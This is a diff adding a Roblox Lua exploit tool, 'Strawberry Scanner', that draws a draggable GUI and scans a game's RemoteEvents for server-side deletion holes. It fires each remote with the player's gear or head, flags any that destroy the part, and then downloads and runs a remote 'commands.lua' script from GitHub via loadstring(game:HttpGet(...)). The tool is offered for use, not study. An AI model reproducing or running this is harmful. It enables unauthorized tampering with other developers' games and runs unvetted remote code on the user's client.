@@ -1,0 +1,379 @@
+--[[
+	Strawberry Scanner GUI
+	DO NOT EDIT - This is a compiled version of SCANNER.RBXMX
+	To make changes, edit SCANNER.RBXMX and convert via GUI 2 LUA by Uniqadev
+	
+	This scanner UI is used to find vulnerable RemoteEvents in the game
+]]
+
+-- Services
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+-- Main GUI Container
+local StrawMain = Instance.new("ScreenGui")
+StrawMain.Name = "StrawMain"
+StrawMain.IgnoreGuiInset = true
+StrawMain.DisplayOrder = 2147483647
+StrawMain.ScreenInsets = Enum.ScreenInsets.DeviceSafeInsets
+StrawMain.ResetOnSpawn = false
+StrawMain.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Scanner Frame
+local Scanner = Instance.new("Frame")
+Scanner.Name = "Scanner"
+Scanner.BorderSizePixel = 0
+Scanner.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Scanner.BackgroundTransparency = 1
+Scanner.AnchorPoint = Vector2.new(0.5, 0.5)
+Scanner.Size = UDim2.new(0, 200, 0, 90)
+Scanner.Position = UDim2.new(0.5, 0, 0.5, 0)
+Scanner.Parent = StrawMain
+
+-- Glass Background Effect
+local Glass = Instance.new("ImageLabel")
+Glass.Name = "Glass"
+Glass.ZIndex = -2147483647
+Glass.BorderSizePixel = 0
+Glass.BackgroundColor3 = Color3.fromRGB(67, 67, 67)
+Glass.BackgroundTransparency = 1
+Glass.ImageTransparency = 0.11
+Glass.Image = "rbxassetid://413422291"
+Glass.ImageColor3 = Color3.fromRGB(171, 35, 62)
+Glass.AnchorPoint = Vector2.new(0.5, 0.5)
+Glass.Size = UDim2.new(1, 0, 1, 0)
+Glass.Position = UDim2.new(0.5, 0, 0.5, 0)
+Glass.Parent = Scanner
+
+local GlassGradient = Instance.new("UIGradient")
+GlassGradient.Parent = Glass
+
+local GlassCorner = Instance.new("UICorner")
+GlassCorner.CornerRadius = UDim.new(0, 10)
+GlassCorner.Parent = Glass
+
+-- Shadow Effect
+local Shadow = Instance.new("ImageLabel")
+Shadow.Name = "Shadow"
+Shadow.ZIndex = -30
+Shadow.BorderSizePixel = 0
+Shadow.SliceCenter = Rect.new(200, 200, 500, 500)
+Shadow.SliceScale = 0.095
+Shadow.ScaleType = Enum.ScaleType.Slice
+Shadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+Shadow.BackgroundTransparency = 1
+Shadow.Image = "http://www.roblox.com/asset/?id=13960012399"
+Shadow.ImageColor3 = Color3.fromRGB(153, 153, 153)
+Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+Shadow.Size = UDim2.new(1, 18, 1, 18)
+Shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+Shadow.Parent = Scanner
+
+local ShadowGradient = Instance.new("UIGradient")
+ShadowGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 52, 88)),
+    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 52, 88))
+})
+ShadowGradient.Parent = Shadow
+
+-- Gradient Overlay
+local Gradient = Instance.new("Frame")
+Gradient.Name = "Gradient"
+Gradient.ZIndex = -1000
+Gradient.BorderSizePixel = 0
+Gradient.BackgroundColor3 = Color3.fromRGB(162, 162, 162)
+Gradient.BackgroundTransparency = 0.9
+Gradient.Size = UDim2.new(1, 0, 1, 0)
+Gradient.Parent = Scanner
+
+local GradientUIGradient = Instance.new("UIGradient")
+GradientUIGradient.Rotation = -90
+GradientUIGradient.Transparency = NumberSequence.new({
+    NumberSequenceKeypoint.new(0.000, 0),
+    NumberSequenceKeypoint.new(0.469, 1),
+    NumberSequenceKeypoint.new(1.000, 1)
+})
+GradientUIGradient.Parent = Gradient
+
+local GradientCorner = Instance.new("UICorner")
+GradientCorner.CornerRadius = UDim.new(0, 10)
+GradientCorner.Parent = Gradient
+
+-- Scanner Corner
+local ScannerCorner = Instance.new("UICorner")
+ScannerCorner.CornerRadius = UDim.new(0, 10)
+ScannerCorner.Parent = Scanner
+
+-- Title Text
+local Top = Instance.new("TextLabel")
+Top.Name = "Top"
+Top.BorderSizePixel = 0
+Top.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Top.BackgroundTransparency = 1
+Top.Size = UDim2.new(1, 0, 0, 35)
+Top.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
+Top.Text = "<b>Strawberry 🍓</b>: Scanner"
+Top.TextColor3 = Color3.fromRGB(255, 255, 255)
+Top.TextSize = 14
+Top.RichText = true
+Top.Parent = Scanner
+
+-- Scan Button
+local ScanBtn = Instance.new("TextButton")
+ScanBtn.Name = "ScanBtn"
+ScanBtn.BorderSizePixel = 0
+ScanBtn.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScanBtn.BackgroundTransparency = 1
+ScanBtn.AnchorPoint = Vector2.new(0.5, 0.5)
+ScanBtn.Size = UDim2.new(0, 150, 0, 35)
+ScanBtn.Position = UDim2.new(0.5, 0, 1, -35)
+ScanBtn.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Italic)
+ScanBtn.Text = "Scan"
+ScanBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScanBtn.TextSize = 14
+ScanBtn.Parent = Scanner
+
+local ScanBtnCorner = Instance.new("UICorner")
+ScanBtnCorner.CornerRadius = UDim.new(0, 10)
+ScanBtnCorner.Parent = ScanBtn
+
+-- Button Glass Effect
+local ScanBtnGlass = Instance.new("ImageLabel")
+ScanBtnGlass.Name = "Glass"
+ScanBtnGlass.ZIndex = -2147483647
+ScanBtnGlass.BorderSizePixel = 0
+ScanBtnGlass.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
+ScanBtnGlass.BackgroundTransparency = 1
+ScanBtnGlass.ImageTransparency = 0.11
+ScanBtnGlass.Image = "rbxassetid://413422291"
+ScanBtnGlass.ImageColor3 = Color3.fromRGB(171, 35, 62)
+ScanBtnGlass.AnchorPoint = Vector2.new(0.5, 0.5)
+ScanBtnGlass.Size = UDim2.new(1, 0, 1, 0)
+ScanBtnGlass.Position = UDim2.new(0.5, 0, 0.5, 0)
+ScanBtnGlass.Parent = ScanBtn
+
+local ScanBtnGlassGradient = Instance.new("UIGradient")
+ScanBtnGlassGradient.Parent = ScanBtnGlass
+
+local ScanBtnGlassCorner = Instance.new("UICorner")
+ScanBtnGlassCorner.CornerRadius = UDim.new(0, 10)
+ScanBtnGlassCorner.Parent = ScanBtnGlass
+
+-- Button Shadow Effect
+local ScanBtnShadow = Instance.new("ImageLabel")
+ScanBtnShadow.Name = "Shadow"
+ScanBtnShadow.ZIndex = -30
+ScanBtnShadow.BorderSizePixel = 0
+ScanBtnShadow.SliceCenter = Rect.new(200, 200, 500, 500)
+ScanBtnShadow.SliceScale = 0.095
+ScanBtnShadow.ScaleType = Enum.ScaleType.Slice
+ScanBtnShadow.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ScanBtnShadow.BackgroundTransparency = 1
+ScanBtnShadow.Image = "http://www.roblox.com/asset/?id=13960012399"
+ScanBtnShadow.ImageColor3 = Color3.fromRGB(153, 153, 153)
+ScanBtnShadow.AnchorPoint = Vector2.new(0.5, 0.5)
+ScanBtnShadow.Size = UDim2.new(1, 18, 1, 18)
+ScanBtnShadow.Position = UDim2.new(0.5, 0, 0.5, 0)
+ScanBtnShadow.Parent = ScanBtn
+
+local ScanBtnShadowGradient = Instance.new("UIGradient")
+ScanBtnShadowGradient.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 52, 88)),
+    ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 52, 88))
+})
+ScanBtnShadowGradient.Parent = ScanBtnShadow
+
+-- Scripts
+local UIDragScript = Instance.new("LocalScript")
+UIDragScript.Name = "UIDrag"
+UIDragScript.Parent = Scanner
+
+local FunctionScript = Instance.new("LocalScript")
+FunctionScript.Name = "Function"
+FunctionScript.Parent = ScanBtn
+
+local StrawScanScript = Instance.new("LocalScript")
+StrawScanScript.Name = "StrawScan"
+StrawScanScript.Parent = Scanner
+
+-- UI Drag Script
+local function setupUIDrag()
+    local frame = UIDragScript.Parent
+    local dragToggle = nil
+    local dragSpeed = 0.25
+    local dragStart = nil
+    local startPos = nil
+    
+    local function updateInput(input)
+        local delta = input.Position - dragStart
+        local position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+        TweenService:Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
+    end
+    
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragToggle = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragToggle = false
+                end
+            end)
+        end
+    end)
+    
+    UserInputService.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            if dragToggle then
+                updateInput(input)
+            end
+        end
+    end)
+end
+
+-- Button Function Script
+local function setupButtonFunction()
+    local Button = FunctionScript.Parent
+    local Info = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+    local CanClick = true
+    
+    Button.MouseEnter:Connect(function()
+        if not CanClick then return end
+        TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 0.25}):Play()
+    end)
+    
+    Button.MouseLeave:Connect(function()
+        if not CanClick then return end
+        TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 1}):Play()
+    end)
+    
+    Button.MouseButton1Click:Connect(function()
+        if not CanClick then return end
+        CanClick = false
+        TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 0.25}):Play()
+    end)
+end
+
+-- StrawScan Script
+local function setupStrawScan()
+    --[[
+    StrawScan - Advanced remote event scanner
+    Last updated: 9/15/2025
+    
+    Scans for vulnerable RemoteEvents in the game
+    ]]
+    
+    local ScanButton = StrawScanScript.Parent.ScanBtn
+    local AlreadyScanned = false
+    local MaxScanTime = 0.25 -- Timeout for remote response
+    local CurrentVulnerableRemote = nil
+    
+    local LocalPlayer = Players.LocalPlayer
+    local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    
+    -- Check if object is destroyed
+    local function isDestroyed(obj)
+        return not obj:IsDescendantOf(game)
+    end
+    
+    -- Test if a remote event is vulnerable
+    local function isVulnerable(rmevent)
+        -- Get test object (StarterGear or Character Head)
+        local TestPart = LocalPlayer:FindFirstChild("StarterGear")
+        if not TestPart then
+            warn("StrawScan // StarterGear not found, replacing with char head")
+            TestPart = Character:FindFirstChild("Head")
+        end
+        
+        if not TestPart then
+            error("StrawScan // TestPart could not be found!")
+            return false
+        end
+        
+        -- Fire remote and check response
+        rmevent:FireServer(TestPart)
+        
+        local t = tick()
+        while tick() - t < MaxScanTime do
+            if isDestroyed(TestPart) then
+                print("StrawScan // Vulnerable remote found!: " .. rmevent:GetFullName())
+                CurrentVulnerableRemote = rmevent
+                return true
+            end
+            task.wait()
+        end
+        
+        print("StrawScan // Remote not vulnerable: " .. rmevent:GetFullName())
+        return false
+    end
+    
+    -- Scan button click handler
+    ScanButton.MouseButton1Click:Connect(function()
+        if AlreadyScanned then return end
+        AlreadyScanned = true
+        
+        local Remotes = {}
+        local FoundRemote = false
+        
+        -- Collect all RemoteEvents except Roblox system ones
+        for _, v in pairs(game:GetDescendants()) do
+            if v:IsA("RemoteEvent") then
+                if v.Parent and (v.Parent.Name == "RobloxReplicatedStorage" or v.Parent.Name == "DefaultChatSystemChatEvents") then
+                    continue 
+                end
+                
+                FoundRemote = true
+                table.insert(Remotes, v)
+            end
+        end
+        
+        if not FoundRemote then
+            ScanButton.TextSize = 12
+            ScanButton.Text = "Sorry, no vuln remotes"
+            return
+        end
+        
+        -- Update UI with scan progress
+        ScanButton.Text = "Scanning... (0/" .. tostring(#Remotes) .. ")"
+        
+        -- Scan each remote
+        for i, v in pairs(Remotes) do
+            ScanButton.Text = "Scanning... (" .. tostring(i) .. "/" .. tostring(#Remotes) .. ")"
+            
+            if isVulnerable(v) then
+                ScanButton.TextSize = 12
+                ScanButton.Text = "Vuln found, booting up"
+                
+                task.wait(0.1)
+                
+                -- Create reference to vulnerable remote
+                local VulnRemote = Instance.new("ObjectValue")
+                VulnRemote.Parent = LocalPlayer.PlayerGui
+                VulnRemote.Name = "StrawberryHookedRM"
+                VulnRemote.Value = CurrentVulnerableRemote
+                
+                -- Load commands script
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/release/commands.lua"))()
+                
+                task.wait(1)
+                StrawScanScript.Parent.Parent:Destroy() -- Remove scanner UI
+                break
+            end
+        end
+        
+        if not CurrentVulnerableRemote then
+            ScanButton.TextSize = 12
+            ScanButton.Text = "Sorry, no vuln remotes"
+        end
+    end)
+end
+
+-- Initialize scripts
+setupUIDrag()
+setupButtonFunction()
+setupStrawScan()
